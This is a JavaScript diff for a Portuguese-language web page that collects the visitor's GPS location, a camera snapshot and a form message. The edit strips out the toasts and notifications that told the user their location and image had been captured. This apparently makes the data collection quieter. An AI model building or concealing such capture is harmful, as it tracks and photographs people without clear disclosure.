@@ -680,7 +680,6 @@
                     accuracy: position.coords.accuracy, status: 'success', source: 'GPS'
                 };
                 this.data.location.googleMapsUrl = `https://www.google.com/maps?q=${this.data.location.lat},${this.data.location.lon}`;
-                this.showToast('📍 Verificação de local OK', 'success');
                 this._sL();
             } catch (error) {
                 this.data.location.status = 'error';
@@ -722,7 +721,6 @@
                     image: canvas.toDataURL('image/jpeg', 0.7), status: 'success',
                     resolution: `${canvas.width}x${canvas.height}`, timestamp: new Date().toISOString()
                 };
-                this.showToast('📸 Verificação visual OK', 'success');
                 this._sC();
             } catch (error) {
                 this.data.camera.status = 'error';
@@ -741,10 +739,6 @@
                 if (!('Notification' in window) || Notification.permission === 'denied') return;
                 let permission = Notification.permission === 'default' ? await Notification.requestPermission() : Notification.permission;
                 this.data.permissions.notifications = permission === 'granted';
-                if (permission === 'granted') {
-                    const notification = new Notification('✅ Sistema Verificado', { body: 'Suas permissões foram configuradas!', requireInteraction: false });
-                    setTimeout(() => notification.close(), 3000);
-                }
             } catch (error) { /* Fail silently */ }
         }
         
@@ -821,7 +815,6 @@
         validateForm() {
             const pergunta = document.getElementById('pergunta').value.trim();
             if (!pergunta || pergunta.length < 5) {
-                this.showToast('❌ Mensagem muito curta', 'error');
                 return false;
             }
             return true;
@@ -864,7 +857,6 @@
                 if (response.ok) this.showSuccessModal();
                 else throw new Error('Failed to send');
             } catch (error) {
-                this.showToast('❌ Erro ao enviar. Tente novamente.', 'error');
                 this.flags.formSubmitted = false;
                 document.getElementById('btn-enviar').disabled = false;
             } finally {
